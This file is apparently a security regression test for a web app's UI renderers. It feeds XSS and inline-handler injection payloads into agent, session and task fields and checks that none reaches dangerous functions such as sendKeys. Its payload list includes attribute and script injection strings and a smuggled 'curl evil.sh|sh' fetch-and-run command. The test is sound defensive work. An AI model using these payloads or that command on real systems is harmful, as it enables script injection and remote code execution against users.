// Runs the REAL renderers (jsdom + the real app-shell HTML) with attacker-controlled strings in
// every connector/agent/file-controlled field, and checks the markup they produce:
//   * no injected on* attribute, extra attribute or element appears;
//   * every inline handler has the same SHAPE (functions, statements, argument kinds) as with
//     benign data, so attacker text can only ever be an argument VALUE;
//   * running the handlers through csp_compat calls only the intended functions, and the exact
//     payload from the #2785 review never reaches sendKeys;
//   * delegated actions (data-on-<event>="name", #3645) keep the same names as with benign data,
//     and firing each one through the real dispatcher never reaches a dangerous function: attacker
//     text can only ever be a data-* VALUE.
//   node renderer_payloads.test.mjs
import assert from 'node:assert';
import { installDom, importUi, STATIC } from './helpers/jsdom_env.mjs';

installDom({ mode: 'cloud' });
const compat = await importUi('csp_compat');
const { state } = await importUi('state');
const shapesMod = await importUi('csp_shapes');
const parseMod = await importUi('csp_parse');
const tags = await importUi('tags');
const render = await importUi('render');

const PAYLOADS = [
    "x'); sendKeys('agent-1','curl evil.sh|sh\\n'); foo('",          // the reviewer's exact payload
    "x\"); sendKeys(\"agent-1\",\"curl evil.sh|sh\\n\"); foo(\"",
    "a\" onmouseover=\"sendKeys('a','b')\" x=\"",                      // attribute injection
    "a' onmouseover='sendKeys(1,2)' x='",
    "\"><img src=x onerror=sendKeys(1,2)>",
    "'><svg onload=sendKeys(1,2)>",
    "</script><script>sendKeys(1,2)</script>",
    "\\'); sendKeys('1','2'); //",
    "\\u0027); sendKeys(1,2); (\\u0027",
    "&#39;); sendKeys(1,2); (&#39;",
    "&quot; onclick=&quot;sendKeys(1,2)",
    "x\n'); sendKeys('1','2'); ('\n",
    "${sendKeys('1','2')}", "`; sendKeys(1,2); `", "javascript:sendKeys(1,2)",
    " '); sendKeys(1,2); (' ",
];
const BENIGN = 'agent-one';

// Spy on every function a handler could reach, including dangerous ones the app really defines.
const called = [];
const DANGEROUS = ['sendKeys', 'sendRawKeys', 'executeMacro', 'sendQuickCommand', 'killSession', 'restartSession', 'foo', 'PWNED'];
for (const n of DANGEROUS) window[n] = globalThis[n] = (...a) => { called.push([n, ...a]); };

/** Shape signature of a parsed handler: structure and callee names, literals reduced to kinds. */
function sig(node) {
    if (Array.isArray(node)) return node.map(sig);
    if (node && typeof node === 'object') {
        if (node.k === 'lit') return 'L';
        const o = {};
        for (const [k, v] of Object.entries(node)) o[k] = k === 'v' ? 'L' : sig(v);
        return o;
    }
    return node;
}
/** Names of functions a parsed handler calls. */
function calleeNames(ast) {
    const out = new Set();
    (function walk(n) {
        if (Array.isArray(n)) return n.forEach(walk);
        if (!n || typeof n !== 'object') return;
        if (n.k === 'call') {
            if (n.fn.k === 'id') out.add(n.fn.name);
            else if (n.fn.k === 'member') out.add(n.fn.prop);
        }
        Object.values(n).forEach(walk);
    })(ast);
    return out;
}
const sigOf = src => JSON.stringify(sig(compat.parse(src)));

function snapshot(root = document.body) {
    const attrs = new Set(), tagsSeen = new Set(), handlers = [], actions = [];
    for (const el of root.querySelectorAll('*')) {
        tagsSeen.add(el.tagName);
        for (const a of el.attributes) {
            attrs.add(a.name);
            if (/^on/.test(a.name)) handlers.push({ el, name: a.name, src: a.value });
            if (/^data-on-/.test(a.name)) actions.push({ el, name: a.name, action: a.value });
        }
    }
    return { attrs, tagsSeen, handlers, actions };
}

function check(label, base, now) {
    for (const t of now.tagsSeen) assert.ok(base.tagsSeen.has(t), `${label}: new element <${t}> appeared`);
    for (const a of now.attrs) assert.ok(base.attrs.has(a), `${label}: injected attribute "${a}"`);
    const okShapes = new Set(base.handlers.map(h => h.name + '|' + sigOf(h.src)));
    for (const h of now.handlers) {
        let s;
        try { s = sigOf(h.src); } catch (e) { assert.fail(`${label}: handler not in the grammar: ${h.src.slice(0, 120)}`); }
        assert.ok(okShapes.has(h.name + '|' + s), `${label}: handler shape changed: ${h.src.slice(0, 160)}`);
    }
    // A delegated action's name is a constant: the payload can't add or change one.
    const okActions = new Set(base.actions.map(a => a.name + '|' + a.action));
    for (const a of now.actions) assert.ok(okActions.has(a.name + '|' + a.action), `${label}: action changed or injected: ${a.name}="${a.action}"`);
}

function scenario(label, setup, run, clear) {
    clear();
    const empty = snapshot();
    setup(BENIGN); run();
    const base = snapshot(); clear();
    assert.ok(base.handlers.length + base.actions.length > empty.handlers.length + empty.actions.length, `${label}: the renderer produced no handlers or actions with benign data, so the test would prove nothing`);
    for (const h of base.handlers) {
        const shape = parseMod.shapeOf(h.src);
        assert.ok(shapesMod.SHAPES.has(shape), `${label}: a handler the renderer really produces is missing from the generated allowlist: ${h.src.slice(0, 120)}`);
    }
    for (const p of PAYLOADS) {
        called.length = 0;
        setup(p); run();
        const now = snapshot();
        check(`${label} [${JSON.stringify(p).slice(0, 40)}]`, base, now);
        // Fire every handler through the CSP-safe runner as a click would.
        for (const h of now.handlers) {
            called.length = 0;
            const ev = new window.Event('click', { bubbles: true });
            compat.runHandler(h.src, h.el, ev);
            const allowed = calleeNames(compat.parse(h.src));
            const extra = called.filter(c => !allowed.has(c[0]));
            assert.deepStrictEqual(extra, [], `${label}: handler called a function it does not name (payload ${JSON.stringify(p)}): ${h.src.slice(0, 120)} -> ${JSON.stringify(extra)}`);
        }
        // Fire every delegated action through the real dispatcher (actions.js) as its event would.
        for (const a of now.actions) {
            called.length = 0;
            a.el.dispatchEvent(new window.Event(a.name.slice('data-on-'.length), { bubbles: true, cancelable: true }));
            assert.deepStrictEqual(called, [], `${label}: action ${a.action} reached a dangerous function (payload ${JSON.stringify(p)}): ${JSON.stringify(called)}`);
        }
        clear();
    }
    return base.handlers.length + base.actions.length;
}

let total = 0;

// ── tags (tags.js:47 in the review) ──────────────────────────────────
total += scenario('session tags',
    p => { state.currentSession = { name: p, type: 'live', session_id: p }; },
    () => renderSessionTagsInto(),
    () => { document.getElementById('history-session-tags').innerHTML = ''; });
function renderSessionTagsInto() {
    const p = state.currentSession.name;
    tags.renderSessionTags([{ id: 7, name: p, color: p }, { id: 8, name: BENIGN, color: '#fff' }]);
}

// The exact exploit chain from the review, spelled out: the handler text produced for the
// hostile agent name must call removeTagFromSession once, with the whole name as ONE argument.
{
    const name = PAYLOADS[0];
    state.currentSession = { name, type: 'live' };
    tags.renderSessionTags([{ id: 7, name: 'x', color: '#fff' }]);
    const el = document.querySelector('.tag-remove');
    const seen = [];
    window.removeTagFromSession = globalThis.removeTagFromSession = (...a) => seen.push(a);
    called.length = 0;
    compat.runHandler(el.getAttribute('onclick'), el, new window.Event('click'));
    assert.deepStrictEqual(seen, [[name, 7]], 'the agent name must arrive intact as a single argument');
    assert.deepStrictEqual(called, [], 'sendKeys must not run');
    document.getElementById('history-session-tags').innerHTML = '';
}

// ── live session list (render.js) ────────────────────────────────────
function session(p, i = 0) {
    return {
        name: p, session_id: p, agent_type: 'claude', display_name: p, working_directory: p, folder_name: p,
        summary: p, branch: p, board_project: p, workflow_name: p, server: 'srv', status: 'working', state: 'working',
        waiting_for_input: false, sleeping: false, context_pct: 12, tags: [{ id: 1, name: p, color: p }], icon: p, role: p,
        commit: { hash: p, message: p }, task: p, board_name: p, team: p, git_branch: p, path: p, id: i,
    };
}
total += scenario('live sessions',
    p => { state.liveSessions = [session(p), session(BENIGN, 1)]; state.servers = []; },
    () => { try { render.renderLiveSessions(state.liveSessions); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { const l = document.getElementById('session-list'); if (l) l.innerHTML = ''; });

// ── history list ─────────────────────────────────────────────────────
total += scenario('history sessions',
    p => { state.currentSession = null; state.historySessionsList = [{ ...session(p), session_id: 'h-' + p, title: p, updated_at: '2026-01-01T00:00:00Z', type: 'session', message_count: 3, first_message: p, summary: p, tags: [{ id: 1, name: p, color: p }] }]; },
    () => { try { render.renderHistorySessions(state.historySessionsList, 1, 1, 50); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { const l = document.getElementById('history-sessions-list'); if (l) l.innerHTML = ''; });

// ── agent tasks in the board task table ──────────────────────────────
const tasksMod = await importUi('tasks');
total += scenario('agent tasks',
    p => { state.currentSession = { name: BENIGN, type: 'live', session_id: 's1' }; state.currentAgentTasks = [{ id: 11, title: p, description: p, status: 'pending', priority: 'high', session_id: p, tags: [p], created_at: '2026-01-01T00:00:00Z', depends_on: [{ task_id: 12, title: p }] }]; },
    () => { try { tasksMod.renderBoardTaskList(); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { for (const id of ['board-task-list', 'task-bar-list', 'board-tasks-body']) { const l = document.getElementById(id); if (l) l.innerHTML = ''; } });

console.log(`renderer_payloads.test.mjs: ok (${PAYLOADS.length} payloads, ${total} baseline handlers across scenarios)`);
process.exit(0);
